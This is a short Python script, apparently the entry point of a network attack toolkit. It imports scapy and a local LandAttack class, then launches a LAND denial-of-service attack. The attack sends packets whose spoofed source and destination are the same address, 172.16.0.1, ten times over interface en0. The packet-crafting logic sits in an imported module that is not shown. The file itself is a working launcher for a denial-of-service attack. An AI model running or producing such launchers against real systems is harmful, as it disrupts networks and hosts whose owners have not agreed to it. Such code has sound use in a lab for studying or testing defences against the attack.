from scapy.layers.inet import TCP, IP, ICMP
from scapy.sendrecv import send

from attack.land_attack import LandAttack

if __name__ == "__main__":
    landAttack = LandAttack("172.16.0.1", "172.16.0.1", 10, "en0")
    landAttack.start()
